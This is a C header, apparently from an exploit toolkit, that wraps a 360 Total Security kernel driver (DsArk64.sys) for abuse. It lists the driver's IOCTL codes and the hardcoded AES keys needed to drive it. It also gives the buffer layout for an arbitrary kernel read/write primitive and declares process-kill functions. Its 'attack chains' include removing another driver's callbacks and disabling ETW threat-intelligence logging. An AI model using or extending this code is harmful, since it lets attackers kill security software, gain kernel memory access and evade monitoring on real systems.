#pragma once
/*
 * dsark64.h - DsArk64.sys IOCTL wrapper definitions
 *
 * Extracted from:  DsArk64.sys (360 Total Security kernel driver)
 * MD5:             b4b6aaa2ee1cc344b7c6752778a279e5
 *
 * Prerequisites:
 *   1. Process must have Administrator token (SeTokenIsAdmin)
 *   2. \Device\360SelfProtection must exist (360 AV running)
 *      OR calling binary is signed with Qihoo 360 code-signing cert
 *   3. Registry key must exist:
 *      HKLM\SYSTEM\CurrentControlSet\services\360FsFlt  → daboot = DWORD:1
 *      (otherwise driver never creates the device)
 */

#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <stdint.h>

// ---------------------------------------------------------------------------
// Device path
// ---------------------------------------------------------------------------
#define DSARK_WIN32_DEVICE      L"\\\\.\\DsArk"
#define DSARK_NT_DEVICE         L"\\Device\\DsArk"

// ---------------------------------------------------------------------------
// IOCTL codes (all METHOD_BUFFERED, FILE_ANY_ACCESS, DeviceType=0x8086)
// ---------------------------------------------------------------------------
#define IOCTL_DSARK_VERSION         0x80863000UL  // Query driver version
#define IOCTL_DSARK_FILE_PROT       0x80863004UL  // File path protection list
#define IOCTL_DSARK_SIMPLE_KILL_A   0x80863008UL  // Simple process kill (raw PID)
#define IOCTL_DSARK_ENC_KILL        0x8086300CUL  // Encrypted process kill
#define IOCTL_DSARK_ENC_KILL_B      0x80863010UL  // Same handler as ENC_KILL
#define IOCTL_DSARK_CLEAR_FLAG      0x80863014UL  // Clear internal flag
#define IOCTL_DSARK_KERN_CHECK      0x80863020UL  // Kernel address range check
#define IOCTL_DSARK_SET_MODE        0x80863024UL  // Set protection mode (0/1)
#define IOCTL_DSARK_KERN_PRIM       0x80863028UL  // Kernel read/write primitive
#define IOCTL_DSARK_REG_PROT        0x80863040UL  // Registry path protection
#define IOCTL_DSARK_SIMPLE_KILL_B   0x80863080UL  // Simple process kill (raw PID)

// ---------------------------------------------------------------------------
// Static AES-128-CBC crypto material (hardcoded in .data of DsArk64.sys)
// ---------------------------------------------------------------------------

// unk_35828 @ VA 0x35828 — never written at runtime
static const uint8_t DSARK_SESSION_KEY[16] = {
    0x62, 0xB4, 0x56, 0xEC,  0x40, 0x7F, 0x0A, 0x9A,
    0x05, 0x91, 0x1C, 0xB6,  0xF2, 0x38, 0xA7, 0xFE
};
// xmmword_35838 @ VA 0x35838 — never written at runtime
static const uint8_t DSARK_SESSION_IV[16] = {
    0xE5, 0x93, 0x29, 0xB6,  0xD4, 0x08, 0xE7, 0xFA,
    0x55, 0x76, 0x37, 0xE6,  0x2C, 0x9E, 0xAA, 0x43
};

// Base key for per-PID derivation (0x8086300C/0x80863010)
// LE representation of literals in sub_136FC:
//   v11[0] = 0xC3911449A96A1370
//   v11[1] = 0x42D5FACA95A16D7C
static const uint8_t DSARK_KILL_BASE_KEY[16] = {
    0x70, 0x13, 0x6A, 0xA9,  0x49, 0x14, 0x91, 0xC3,
    0x7C, 0x6D, 0xA1, 0x95,  0xCA, 0xFA, 0xD5, 0x42
};
// LE representation of:
//   v12[0] = 0xA173290C4C411FA6
//   v12[1] = 0x40DDDFBA77034FF6
static const uint8_t DSARK_KILL_BASE_IV[16] = {
    0xA6, 0x1F, 0x41, 0x4C,  0x0C, 0x29, 0x73, 0xA1,
    0xF6, 0x4F, 0x03, 0x77,  0xBA, 0xDF, 0xDD, 0x40
};

// ---------------------------------------------------------------------------
// Kernel primitive opcodes (IOCTL_DSARK_KERN_PRIM payload[0])
// ---------------------------------------------------------------------------
#define KPRIM_WRITE         1   // arbitrary write  — max 0x200 bytes
#define KPRIM_READ          2   // arbitrary read   — max 0x020 bytes per call
#define KPRIM_MAP_USER      3   // lock user pages + map
#define KPRIM_ATOMIC_CMP    4   // InterlockedCompareExchange on kernel global
#define KPRIM_UNK5          5
#define KPRIM_UNK6          6
#define KPRIM_MAP_KERN      7   // ProbeForWrite + MDL map user→kernel
#define KPRIM_ATOMIC_XCHG   8   // InterlockedExchange + DPC

// ---------------------------------------------------------------------------
// IOCTL_DSARK_KERN_PRIM buffer layout (plaintext, before AES-CBC encrypt)
// ---------------------------------------------------------------------------
//
//  Offset  Size  Description
//  0x00    16    MD5 of bytes [0x10 .. Options-1]     (integrity check)
//  0x10     4    type (KPRIM_*)
//  0x14     4    data_size  (bytes to read/write)
//  0x18     8    kernel address (src for read, dst for write)
//  0x20     N    data area:
//                  WRITE → source data to write
//                  READ  → zero-filled; kernel fills this on return
//
//  Constraints:
//    InBufferSize == OutBufferSize (same size)
//    0x20 <= size <= 0x400
//    size % 16 == 0
//
//  After IOCTL returns:
//    OutBuffer is the DECRYPTED buffer (driver decrypts but does NOT re-encrypt)
//    For READ:  OutBuffer[0x20 .. 0x20+data_size-1] contains kernel data
//

// Helper macro: size needed for a kern read/write of N data bytes
// = 0x10 (MD5) + 0x10 (hdr) + N, rounded up to multiple of 16
#define KPRIM_BUF_SIZE(n)  (((0x20 + (n) + 15) & ~15))

// ---------------------------------------------------------------------------
// File protection commands (IOCTL_DSARK_FILE_PROT)
// ---------------------------------------------------------------------------
#define FPROT_ADD_NORMAL    1
#define FPROT_REMOVE_NORMAL 2
#define FPROT_ADD_WILDCARD  3
#define FPROT_REMOVE_WILDCARD 4
#define FPROT_ADD_TYPE4     5
#define FPROT_REMOVE_TYPE4  6
#define FPROT_CLEAR_ALL     7
// cmd 8 → sets internal dword_35B18 flag (undocumented side effect)

// Registry protection commands (IOCTL_DSARK_REG_PROT)
#define RPROT_ADD_A         2
#define RPROT_ADD_B         4
#define RPROT_SPECIAL       6
#define RPROT_CLEAR_ALL     8

// File/Reg protection buffer size (MUST be exactly 0x400 bytes)
#define PROT_BUF_SIZE       0x400

// Magic value required in first DWORD of IOCTL_DSARK_KERN_CHECK input
#define KERN_CHECK_MAGIC    0x0C080002UL

// ---------------------------------------------------------------------------
// Return values / error codes
// ---------------------------------------------------------------------------
#define DSARK_OK            ERROR_SUCCESS
#define DSARK_ERR_OPEN      0x1000
#define DSARK_ERR_CRYPTO    0x1001
#define DSARK_ERR_IOCTL     0x1002
#define DSARK_ERR_PARAM     0x1003

// ---------------------------------------------------------------------------
// Public API — device
// ---------------------------------------------------------------------------
#ifdef __cplusplus
extern "C" {
#endif

HANDLE  DsArkOpen(void);
void    DsArkClose(HANDLE hDev);

// ---------------------------------------------------------------------------
// Public API — crypto helpers
// ---------------------------------------------------------------------------
BOOL    DsArkAesCbcEncrypt(const uint8_t* plain, DWORD size,
                            const uint8_t key[16], const uint8_t iv[16],
                            uint8_t* cipher);
BOOL    DsArkAesCbcDecrypt(const uint8_t* cipher, DWORD size,
                            const uint8_t key[16], const uint8_t iv[16],
                            uint8_t* plain);
BOOL    DsArkMD5(const uint8_t* data, DWORD size, uint8_t hash[16]);
void    DsArkDeriveKillKey(DWORD callerPid, uint8_t derivedKey[16]);

// ---------------------------------------------------------------------------
// Public API — simple IOCTLs (no encryption needed)
// ---------------------------------------------------------------------------
DWORD   DsArkGetVersion(HANDLE hDev);          // returns 0x11000231 on success
BOOL    DsArkSimpleKill(HANDLE hDev, DWORD targetPid);
BOOL    DsArkClearFlag(HANDLE hDev);
BOOL    DsArkSetMode(HANDLE hDev, DWORD mode); // mode = 0 or 1
BOOL    DsArkKernAddrCheck(HANDLE hDev, DWORD* pResult);

// ---------------------------------------------------------------------------
// Public API — encrypted process kill (0x8086300C / 0x80863010)
// ---------------------------------------------------------------------------
// useAltCode: FALSE → use 0x8086300C, TRUE → use 0x80863010 (same handler)
BOOL    DsArkEncKill(HANDLE hDev, DWORD targetPid, BOOL useAltCode);

// ---------------------------------------------------------------------------
// Public API — kernel read/write (0x80863028)
// ---------------------------------------------------------------------------
// Single call — max 32 bytes for read, 512 bytes for write
BOOL    DsArkKernRead (HANDLE hDev, uint64_t addr, void* buf,        DWORD size);
BOOL    DsArkKernWrite(HANDLE hDev, uint64_t addr, const void* data, DWORD size);

// Multi-call helpers — batches automatically
BOOL    DsArkKernReadEx (HANDLE hDev, uint64_t addr, void* buf,        SIZE_T total);
BOOL    DsArkKernWriteEx(HANDLE hDev, uint64_t addr, const void* data, SIZE_T total);

// ---------------------------------------------------------------------------
// Public API — file/registry protection
// ---------------------------------------------------------------------------
BOOL    DsArkFileProtect(HANDLE hDev, DWORD cmd, const WCHAR* path);
BOOL    DsArkRegProtect (HANDLE hDev, DWORD cmd, const WCHAR* path);

// ---------------------------------------------------------------------------
// Public API — attack chains
// ---------------------------------------------------------------------------
BOOL     DsArkRemoveCallbacks(HANDLE hDev, const WCHAR* targetDriverName);
BOOL     DsArkDisableEtwTI   (HANDLE hDev);

// Utility: parse ntoskrnl exports from disk, return kernel VA of named symbol.
// kernBase: from NtQuerySystemInformation(SystemModuleInformation).Modules[0].ImageBase
// funcName: ASCII export name (e.g., "KdDebuggerEnabled", "PsInitialSystemProcess")
// Returns 0 on failure.
uint64_t DsArkGetKernelExport(uint64_t kernBase, const char* funcName);

#ifdef __cplusplus
}
#endif
